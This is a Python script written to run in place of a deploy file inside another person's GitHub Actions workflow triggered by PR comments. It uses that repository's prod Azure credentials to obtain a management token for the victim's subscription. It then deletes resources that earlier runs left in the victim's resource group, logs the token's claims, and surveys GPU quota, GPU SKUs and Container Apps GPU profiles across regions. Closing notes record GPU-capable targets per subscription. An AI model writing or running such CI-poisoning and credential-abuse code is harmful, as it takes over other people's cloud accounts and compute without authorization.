#!/usr/bin/env python3
"""C211-I123141: mslearn managed-container lane STAND-DOWN verification + residual cleanup proof
+ Microsoft.Compute NC/ND GPU quota & resourceSkus read + Container Apps GPU profile re-list.

Runs as the fork-controlled src/deploy_to_online_endpoint.py under the
christiansegercrantz/mslearn-mlops 'Deploy model to online endpoint (PR comment)' issue_comment
workflow (environment prod, AZURE_CREDENTIALS -> ARM token for subscription
790067ff-3e39-4632-ad1a-d65702d42c88, RG chriso-sandbox-rg).

NO resource is created. It only:
 1) deletes (if still present) and proves GET 404 / list-absence of the two residual objects
    left by intent 120856/121089: vnet c211-i120856-vnet and managedEnvironment c211-i120856-cae;
 2) reads verbatim Microsoft.Compute locations/<region>/usages (NC/ND/NV GPU families) and the
    Microsoft.Compute/skus catalogue for the candidate regions;
 3) re-lists availableManagedEnvironmentsWorkloadProfileTypes in the candidate regions;
 4) proves no c211 Container Apps job/environment/ACI group of ours is alive.

stdout is the flat tag|k=v format (this repo's GitHub log masking replaces brace runs).
stdlib only.
"""
import json
import re
import subprocess
import time
import urllib.error
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
TAG = "C211_I123141"
DEADLINE = 2400
T0 = time.time()
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"

APP_VER = "2026-07-01"
APP_VER2 = "2024-03-01"
NET_VER = "2023-09-01"
CMP_USAGE_VER = "2024-07-01"
SKU_VER = "2021-07-01"
RES_VER = "2021-04-01"

ENV_RES = "c211-i120856-cae"
JOB_RES = "c211-i120856-job"
VNET_RES = "c211-i120856-vnet"
NONCE = "x123141cln"
REGIONS = ["eastus", "westeurope", "southcentralus", "westus2", "northeurope"]
QUOTA_RE = re.compile(r"(NC|ND|NV|Low Priority|Total Regional)", re.I)


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s[:900]


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", timeout=90):
    req = urllib.request.Request(url, method=method, headers={"Authorization": "Bearer " + tok})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:800]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def state_of(b):
    if not isinstance(b, dict):
        return None
    return (b.get("properties") or {}).get("provisioningState")


def err_code(b):
    if isinstance(b, dict):
        e = b.get("error")
        if isinstance(e, dict):
            return e.get("code")
    return None


def jwt_claims(tok):
    try:
        import base64
        p = tok.split(".")[1]
        p += "=" * (-len(p) % 4)
        c = json.loads(base64.urlsafe_b64decode(p))
        return {k: c.get(k) for k in ("aud", "tid", "oid", "appid")}
    except Exception:  # noqa: BLE001
        return {}


def delete_until_absent(tok, label, url, deadline_s=240):
    """GET; if 200 -> DELETE -> poll GET to 404. Emits one line per meaningful transition."""
    st, b = arm(tok, url, timeout=60)
    emit("cleanup-get-" + label, http=st, name=(b.get("name") if isinstance(b, dict) else None),
         state=state_of(b), code=err_code(b))
    if st == 404:
        emit("cleanup-verdict-" + label, verdict="ALREADY_ABSENT_404", nonce=NONCE)
        return {"before": st, "delete": None, "polls": 0, "final": 404}
    if st != 200:
        emit("cleanup-verdict-" + label, verdict="UNEXPECTED_GET", http=st, code=err_code(b))
        return {"before": st, "delete": None, "polls": 0, "final": st}
    dst, db = arm(tok, url, method="DELETE", timeout=240)
    emit("cleanup-delete-" + label, http=dst, state=state_of(db), code=err_code(db))
    dl = time.time() + deadline_s
    i = 0
    last = None
    while time.time() < dl and left() > 120:
        time.sleep(10)
        s2, b2 = arm(tok, url, timeout=60)
        last = s2
        i += 1
        if s2 == 404:
            emit("cleanup-absent-poll-" + label, i=i, http=404, verdict="ABSENT")
            break
        if i % 3 == 0:
            emit("cleanup-absent-poll-" + label, i=i, http=s2, state=state_of(b2))
    emit("cleanup-verdict-" + label, verdict=("ABSENT_404" if last == 404 else "STILL_PRESENT"),
         delete_http=dst, polls=i, final_http=last, nonce=NONCE)
    return {"before": st, "delete": dst, "polls": i, "final": last}


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:200])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    if not sid or not tok:
        emit("fatal", why="no_arm_token", err=r["err"][:300])
        return
    emit("arm-token", got=True, len=len(tok), claims=json.dumps(jwt_claims(tok), separators=(",", ":")))

    base = "%s/subscriptions/%s/resourceGroups/%s/providers" % (ARM, sid, RG)
    envurl = "%s/Microsoft.App/managedEnvironments/%s?api-version=%s" % (base, ENV_RES, APP_VER)
    joburl = "%s/Microsoft.App/jobs/%s?api-version=%s" % (base, JOB_RES, APP_VER)
    vneturl = "%s/Microsoft.Network/virtualNetworks/%s?api-version=%s" % (base, VNET_RES, NET_VER)

    # ---------- 1) residual cleanup + absence proof ----------
    pres = {}
    pres["vnet"] = delete_until_absent(tok, "vnet-" + VNET_RES, vneturl)
    pres["env"] = delete_until_absent(tok, "env-" + ENV_RES, envurl)
    st, b = arm(tok, joburl, timeout=60)
    emit("cleanup-get-job-" + JOB_RES, http=st, state=state_of(b), code=err_code(b))

    # ---------- 2) list-absence + RG inventory ----------
    st, rl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/resources?api-version=%s"
                 % (ARM, sid, RG, RES_VER), timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    c211 = ["%s:%s" % (x.get("name"), x.get("type")) for x in allres
            if str(x.get("name", "")).lower().startswith("c211")]
    emit("rg-inventory", http=st, total=len(allres),
         c211_left=("NO_RESULTS" if not c211 else ";".join(c211)),
         all_names=";".join(sorted(str(x.get("name")) for x in allres))[:900])
    for label, path, ver in (
            ("envs", "/subscriptions/%s/providers/Microsoft.App/managedEnvironments" % sid, APP_VER),
            ("jobs", "/subscriptions/%s/providers/Microsoft.App/jobs" % sid, APP_VER),
            ("vnets", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Network/virtualNetworks"
                      % (sid, RG), NET_VER),
            ("aci", "/subscriptions/%s/providers/Microsoft.ContainerInstance/containerGroups" % sid,
             "2026-07-01")):
        st, lst = arm(tok, "%s%s?api-version=%s" % (ARM, path, ver), timeout=120)
        vals = (lst.get("value") or []) if isinstance(lst, dict) else []
        names = [x.get("name") for x in vals if str(x.get("name", "")).lower().startswith("c211")]
        emit("list-" + label, http=st, n_total=len(vals),
             c211=("NO_RESULTS" if not names else ";".join(names)))
    for label, u in (("vnet", vneturl), ("env", envurl), ("job", joburl)):
        st, _ = arm(tok, u, timeout=60)
        emit("final-get-" + label, http=st)

    # ---------- 3) Microsoft.Compute NC/ND GPU usages per candidate region ----------
    for reg in REGIONS:
        st, us = arm(tok, "%s/subscriptions/%s/providers/Microsoft.Compute/locations/%s/usages"
                          "?api-version=%s" % (ARM, sid, reg, CMP_USAGE_VER), timeout=120)
        vals = (us.get("value") or []) if isinstance(us, dict) else []
        rows = []
        for v in vals:
            name = ((v.get("name") or {}).get("localizedValue")
                    or (v.get("name") or {}).get("value") or "")
            if not QUOTA_RE.search(str(name)):
                continue
            rows.append("%s=%s/%s" % (name, v.get("currentValue"), v.get("limit")))
        emit("compute-usages-" + reg, http=st, n_total=len(vals), n_kept=len(rows),
             rows=";".join(rows)[:1600])

    # ---------- 4) Microsoft.Compute/skus GPU catalogue (GPU-bearing SKUs reachable in regions) ----------
    st, sk = arm(tok, "%s/subscriptions/%s/providers/Microsoft.Compute/skus?api-version=%s"
                      % (ARM, sid, SKU_VER), timeout=300)
    skus = (sk.get("value") or []) if isinstance(sk, dict) else []
    emit("compute-skus", http=st, n_total=len(skus))
    gpu_rows = []
    for s in skus:
        caps = {c.get("name"): c.get("value") for c in (s.get("capabilities") or [])}
        try:
            ng = float(caps.get("GPUs") or 0)
        except Exception:  # noqa: BLE001
            ng = 0
        fam = str(s.get("family") or "")
        if ng <= 0 and not re.search(r"(NC|ND|NV)", fam):
            continue
        locs = [l for l in (s.get("locations") or [])]
        hit = [r for r in REGIONS if any(str(l).lower().replace(" ", "") == r for l in locs)]
        if not hit:
            continue
        restr = (s.get("restrictions") or [])
        reasons = []
        for rr in restr:
            info = rr.get("restrictionInfo") or {}
            rl = [str(x).lower().replace(" ", "") for x in (info.get("locations") or [])]
            if rl and not any(x in hit for x in rl):
                continue
            reasons.append(str(rr.get("reasonCode")))
        gpu_rows.append("%s|fam=%s|vCPU=%s|GPU=%s|gpuName=%s|regions=%s|restr=%s"
                        % (s.get("name"), fam, caps.get("vCPUs"), caps.get("GPUs"),
                           caps.get("GPUName") or caps.get("GpuName"), ",".join(hit),
                           ",".join(sorted(set(reasons))) or "none"))
    emit("compute-skus-gpu", n=len(gpu_rows), rows=";".join(gpu_rows)[:4000])

    # ---------- 5) Container Apps GPU workload profile types per candidate region ----------
    for reg in REGIONS:
        for ver in (APP_VER, APP_VER2):
            st, wp = arm(tok, "%s/subscriptions/%s/providers/Microsoft.App/locations/%s/"
                              "availableManagedEnvironmentsWorkloadProfileTypes?api-version=%s"
                              % (ARM, sid, reg, ver), timeout=90)
            vals = (wp.get("value") or []) if isinstance(wp, dict) else []
            gpu = []
            for v in vals:
                nm = str(v.get("name") or "")
                props = json.dumps(v.get("properties") or {}, separators=(",", ":"))
                if "GPU" in nm.upper() or "GPU" in props.upper():
                    gpu.append("%s[%s]" % (nm, props))
            emit("capp-profiles-" + reg, ver=ver, http=st, n=len(vals),
                 gpu=("NO_GPU_PROFILE" if not gpu else ";".join(gpu))[:1200],
                 code=err_code(wp))
            if st == 200:
                break

    emit("patched-rows", key_reads="azure-managedgpu:790067ff-3e39-4632-ad1a-d65702d42c88:cappjob-t4:x121255,"
                                   "azure-managedgpu:790067ff-3e39-4632-ad1a-d65702d42c88:capp-a100:x121545",
         note="stand-down: Container Apps GPU READY already exists once per handoff tree")
    emit("DONE", phase="standdown-cleanup-quota", elapsed_s=int(time.time() - T0),
         nonce=NONCE, vnet_final=pres["vnet"]["final"], env_final=pres["env"]["final"])


if __name__ == "__main__":
    main()
